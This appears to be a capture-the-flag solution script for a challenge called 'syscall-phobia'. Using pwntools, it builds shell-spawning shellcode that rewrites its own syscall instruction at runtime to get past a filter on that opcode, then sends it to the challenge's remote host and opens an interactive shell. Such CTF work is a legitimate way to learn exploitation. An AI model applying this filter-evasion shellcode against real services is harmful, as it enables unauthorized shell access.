from pwn import *
context.binary = 'syscall-phobia'
# note that *0x6020A0 == &shellcode
shellcode = asm(shellcraft.sh())
syscall_off = shellcode.find(b'\x0f\x05')
# The idea here is to just write the syscall instruction to where it should be in shellcode
writer = '''mov rax, QWORD [0x602098]
add rax, {}
mov word ptr [rax], 0x500
mov byte ptr [rax], 0xf'''
off = len(asm(writer.format(20))) + syscall_off
shellcode = asm(writer.format(off)) + shellcode[:-2]
print(disasm(shellcode))

r = remote('ctf-f3jj.balancedcompo.site', 9998)
r.sendlineafter('tenks): \n', shellcode.hex())
r.interactive()
